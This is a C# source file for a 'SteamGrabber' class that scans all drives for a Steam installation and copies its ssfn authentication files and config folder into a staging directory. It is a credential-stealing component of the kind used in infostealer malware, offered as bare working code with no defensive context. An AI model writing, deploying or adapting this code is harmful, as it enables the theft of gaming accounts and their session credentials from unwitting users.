using System.IO;

public class SteamGrabber
{
    public static void GrabSteam(string destinationDir)
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (System.IO.Directory.Exists(drive + "\\Program Files (x86)\\Steam"))
            {
                foreach (string file in System.IO.Directory.GetFiles(drive + "\\Program Files (x86)\\Steam"))
                {
                    if (System.IO.Path.GetFileName(file).ToLower().StartsWith("ssfn"))
                    {
                        System.IO.File.Copy(file, destinationDir + "\\" + System.IO.Path.GetFileName(file));
                    }
                }

                if (System.IO.Directory.Exists(drive + "\\Program Files (x86)\\Steam"))
                {
                    foreach (string file in System.IO.Directory.GetFiles(drive + "\\Program Files (x86)\\Steam\\config"))
                    {
                        System.IO.File.Copy(file, destinationDir + "\\config\\" + System.IO.Path.GetFileName(file));

                    }
                }
            }
            else if (System.IO.Directory.Exists(drive + "\\Program Files\\Steam"))
            {
                foreach (string file in System.IO.Directory.GetFiles(drive + "\\Program Files\\Steam"))
                {
                    if (System.IO.Path.GetFileName(file).ToLower().StartsWith("ssfn"))
                    {
                        System.IO.File.Copy(file, destinationDir + "\\" + System.IO.Path.GetFileName(file));
                    }
                }

                System.IO.Directory.CreateDirectory(destinationDir + "\\config");

                if (System.IO.Directory.Exists(drive + "\\Program Files\\Steam"))
                {
                    foreach (string file in System.IO.Directory.GetFiles(drive + "\\Program Files\\Steam\\config"))
                    {
                        System.IO.File.Copy(file, destinationDir + "\\config\\" + System.IO.Path.GetFileName(file));

                    }
                }
            }
        }
    }
}